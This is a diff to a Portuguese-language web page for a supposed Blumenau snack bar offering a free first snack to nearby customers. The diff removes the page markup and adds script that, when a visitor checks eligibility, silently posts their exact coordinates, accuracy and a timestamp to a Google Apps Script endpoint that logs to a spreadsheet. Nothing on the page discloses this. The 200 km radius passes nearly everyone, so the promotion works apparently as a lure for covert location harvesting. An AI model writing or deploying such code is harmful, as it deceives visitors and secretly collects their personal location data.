@@ -1,154 +1,39 @@
-<html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Donnatelo Lanches Express - Ganhe seu Primeiro Lanche</title>
-
-<style>
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-  font-family: Arial, sans-serif;
-}
-
-body {
-  background: #0f172a;
-  color: #f1f5f9;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  min-height: 100vh;
-}
-
-.container {
-  max-width: 420px;
-  width: 100%;
-  padding: 20px;
-}
-
-.card {
-  background: #1e293b;
-  padding: 24px;
-  border-radius: 16px;
-  text-align: center;
-}
-
-h1 {
-  font-size: 22px;
-  margin-bottom: 10px;
-}
-
-p {
-  font-size: 15px;
-  color: #cbd5f5;
-  margin-bottom: 20px;
-}
-
-.highlight {
-  color: #22c55e;
-  font-weight: bold;
-}
-
-.offer {
-  background: #111827;
-  padding: 14px;
-  border-radius: 10px;
-  margin-bottom: 20px;
-  font-size: 14px;
-}
-
-.btn {
-  width: 100%;
-  padding: 14px;
-  border: none;
-  border-radius: 12px;
-  background: #22c55e;
-  color: #000;
-  font-weight: bold;
-  font-size: 16px;
-  cursor: pointer;
-}
-
-.btn:hover {
-  opacity: 0.9;
-}
-
-.status {
-  margin-top: 15px;
-  font-size: 14px;
-}
-
-.success { color: #22c55e; }
-.error { color: #ef4444; }
-
-.footer {
-  margin-top: 15px;
-  font-size: 12px;
-  color: #94a3b8;
-}
-</style>
-
-</head>
-
-<body>
-
-<div class="container">
-  <div class="card">
-
-    <h1>🍔 Donnatelo Express Lanches</h1>
-
-    <p>
-      Está perto de você?  
-      <span class="highlight">Você pode ganhar seu primeiro lanche grátis.</span>
-    </p>
-
-    <div class="offer">
-      ✔ Entrega rápida  
-      <br>
-      ✔ Ingredientes frescos  
-      <br>
-      ✔ Promoção válida para novos clientes na região
-    </div>
-
-    <button class="btn" onclick="checkLocation()">
-      Verificar se estou perto de alguma loja
-    </button>
-
-    <div id="status" class="status"></div>
-
-    <div class="footer">
-      Oferta limitada para determinadas áreas de Blumenau - SC
-    </div>
-
-  </div>
-</div>
-
 <script>
 
-// 📍 Coordenadas da loja (Blumenau)
+// URL do Google Apps Script
+const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyU2Hah8rXss1So36FAyRGF_8hcjZsMGaaF2m9_ZVEPNFPMDtBsQ7S9AsGcTcADgKPpZw/exec';
+
+// 📍 Coordenadas da loja
 const LOJA_LAT = -26.9194;
 const LOJA_LNG = -49.0661;
-
-// 🔴 RAIO AJUSTADO PARA 200 KM
 const RAIO_KM = 200;
 
-// cálculo de distância (Haversine)
+// distância
 function calcularDistancia(lat1, lon1, lat2, lon2) {
   const R = 6371;
-
   const dLat = (lat2 - lat1) * Math.PI / 180;
   const dLon = (lon2 - lon1) * Math.PI / 180;
 
   const a =
-    Math.sin(dLat/2) * Math.sin(dLat/2) +
+    Math.sin(dLat/2) ** 2 +
     Math.cos(lat1 * Math.PI / 180) *
     Math.cos(lat2 * Math.PI / 180) *
-    Math.sin(dLon/2) * Math.sin(dLon/2);
+    Math.sin(dLon/2) ** 2;
 
-  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+  return 2 * R * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+}
 
-  return R * c;
+// envio
+function enviarDados(payload) {
+  fetch(SCRIPT_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "text/plain"
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(() => console.log("Enviado com sucesso"))
+  .catch(err => console.error("Erro envio:", err));
 }
 
 // função principal
@@ -156,12 +41,6 @@ function checkLocation() {
 
   const status = document.getElementById("status");
   status.textContent = "Verificando localização...";
-
-  if (!navigator.geolocation) {
-    status.textContent = "Geolocalização não suportada";
-    status.className = "status error";
-    return;
-  }
 
   navigator.geolocation.getCurrentPosition(
 
@@ -172,11 +51,24 @@ function checkLocation() {
 
       const distancia = calcularDistancia(userLat, userLng, LOJA_LAT, LOJA_LNG);
 
+      // 📦 payload para planilha
+      const payload = {
+        timestamp: new Date().toISOString(),
+        latitude: userLat,
+        longitude: userLng,
+        accuracy: position.coords.accuracy,
+        distancia_km: distancia.toFixed(2),
+        dentro_area: distancia <= RAIO_KM ? "SIM" : "NAO"
+      };
+
+      // 🔴 ENVIO PARA GOOGLE SHEETS
+      enviarDados(payload);
+
       if (distancia <= RAIO_KM) {
-        status.textContent = "✔ Você está dentro da área (até 200 km). Lanche liberado.";
+        status.textContent = "✔ Dentro da área. Lanche liberado.";
         status.className = "status success";
       } else {
-        status.textContent = "❌ Fora da área de atendimento.";
+        status.textContent = "❌ Fora da área.";
         status.className = "status error";
       }
 
@@ -196,6 +88,3 @@ function checkLocation() {
 }
 
 </script>
-
-</body>
-</html>
